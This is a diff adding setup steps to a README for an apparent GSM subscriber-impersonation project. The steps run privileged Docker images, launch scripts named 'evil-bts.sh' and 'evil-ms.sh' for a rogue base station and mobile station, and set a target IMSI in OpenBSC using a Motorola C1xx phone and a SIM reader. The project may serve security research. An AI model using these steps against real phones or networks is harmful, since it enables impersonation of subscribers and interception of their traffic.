@@ -494,6 +494,33 @@ The hacked process is :
 With french explanations ;) sorry...
 
 [Impersonalisaion (français)](https://www.youtube.com/watch?v=gHKmmVZAaFo)
+https://imgur.com/lUjkpGp
+First of all there is a bug with brltty so
+apt remove brltty on host (not on docker !)
+Launch 1st
+sudo docker run -it --privileged --user root --cap-add ALL  -v /dev/bus/usb:/dev/bus/usb bastienbaranoff/ms-final:hell_yeah
+
+Launch 2nd
+sudo docker run -it --privileged --user root --cap-add ALL  -v /dev/bus/usb:/dev/bus/usb bastienbaranoff/bts-final:hell_yeah
+In this order cause need ip 172.17.0.2 for ms and 172.17.0.3 for bts (socket are made to work with theses addresses)
+
+in bts
+tmux
+cd /
+service pcscd start
+./evil-bts.sh
+
+then in ms :
+tmux
+cd /
+bash trx.sh
+ctrl-b c 
+./evil-ms.sh
+
+set IMSI in OpenBSC (via telnet)
+and in /root/.osmocom/bb/mobile.cfg
+and set any ki but set one in OpenBSC
+need a motorola c1** and a sim reader
 
 What happen next ?
 
